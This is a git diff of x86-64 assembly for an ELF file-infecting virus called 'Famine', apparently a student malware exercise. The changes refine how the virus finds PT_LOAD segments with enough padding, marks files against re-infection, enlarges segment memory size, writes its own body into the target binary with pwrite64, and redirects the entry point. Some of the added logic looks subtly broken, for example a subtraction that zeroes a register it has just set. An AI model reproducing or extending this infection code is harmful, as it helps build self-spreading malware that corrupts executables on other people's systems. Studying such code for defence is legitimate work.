@@ -415,6 +415,8 @@ print_rax:
 	.not_usseles_ph:
 	dec	rcx
 	jnz	.loop
+		cmp		r13, 1
+		je		.return
 
 		mov		rax, [rel p_vaddr]
 		;add		rax, [rel elfb + ehdr.e_shoff]
@@ -534,6 +536,7 @@ print_rax:
 		; Here start the injection
 
 
+
 		mov		rax, [rel elfb + 0x18]		; e_entry
 		mov		[old_entry], rax
 
@@ -549,12 +552,29 @@ print_rax:
 		call	infection_0
 		test	rax, rax
 		jz		.close_file
-		; call _add_empty_section
 
+		lea		rdi, [rel elfp0]	; Cleaning du buffer elfp0
+		mov		rcx, 7
+		xor		rax, rax
+		rep		stosq
+
+		lea		rdi, [rel elfp1]	; Cleaning du buffer elfp1
+		mov		rcx, 7
+		xor		rax, rax
+		rep		stosq
+
+
+		movzx	rcx, word [rel elfb + 0x38]	; e_phnum
+		movzx	rdi, word [rel elfb + 0x36]	; e_phentisize
+		xor		r11, r11
+		xor		r10, r10
+
+		; call _add_empty_section
 		.start_loop_phdr:
 			test	rcx, rcx
 			jz		.end_loop_phdr
 			mov		r10, rcx
+			sub		r10, rcx
 			imul	r10, rdi
 			add		r10, 64
 			push	r11
@@ -568,7 +588,7 @@ print_rax:
 			pop		rdi
 			pop		rcx
 			pop		r11
-
+			xor		rax, rax
 			; r9 -> target_phdr offset
 			cmp		dword [rel elfp0], 1 ; est-ce un load ?
 			jne		.next_it_phdr
@@ -592,25 +612,23 @@ print_rax:
 			pop		rcx
 			pop		r11
 
-
 		.next_it_phdr:
 			dec		rcx
 			jmp		.start_loop_phdr
 		.end_loop_phdr:
 			test	r11, r11
 			jz		.close_file
-
 			; check padding size
 			; padding = next_header_off - (curr_header_off + header_size)
 			mov		rax, [rel elfp1 + phdr.p_offset] ; p_offset next seg
 			mov		rdx, [rel elfp0 + phdr.p_offset] ; p_offset curr seg
 			add		rdx, [rel elfp0 + phdr.p_filesz]
 			sub		rax, rdx
-
 			; padding < FAMINE_SIZE
+			call	print_rax
 			cmp		rax, FAMINE_SIZE
 			jl		.close_file
-
+		.skip:
 			; mark file for avoid re-infection
 			push	r9
 			push	r11
@@ -665,7 +683,7 @@ print_rax:
 
 			; compute p_memsz
 			mov		rdi, qword [rel elfp1 + phdr.p_memsz]
-			add		rdi, FAMINE_SIZE
+			add		rdi, FAMINE_SIZE_NO_BSS
 			mov		[rel elfp1 + phdr.p_memsz], rdi
 			pop		r11
 
@@ -699,7 +717,7 @@ print_rax:
 			push	r11
 			push	r9
 			lea		rsi, [rel _start]
-			mov		rdx, FAMINE_SIZE
+			mov		rdx, FAMINE_SIZE_NO_BSS
 			mov		r10, r11
 			mov		rdi, r12
 			mov		rax, SYS_pwrite64
@@ -785,6 +803,8 @@ end_:
 
 ; NEW HEADER
 new_programheader:
+	elfp0	times 0056 db 0
+	elfp1	times 0056 db 0
 	p_type		dd	1
 	p_flags		dd	7
 	p_offset	dq	0
@@ -798,7 +818,5 @@ new_programheader:
 buffer_bss:
 	padd	times 0512 db 0
 	buff	times 4096 db 0
-	elfp0	times 0056 db 0
-	elfp1	times 0056 db 0
 
 end_addr:
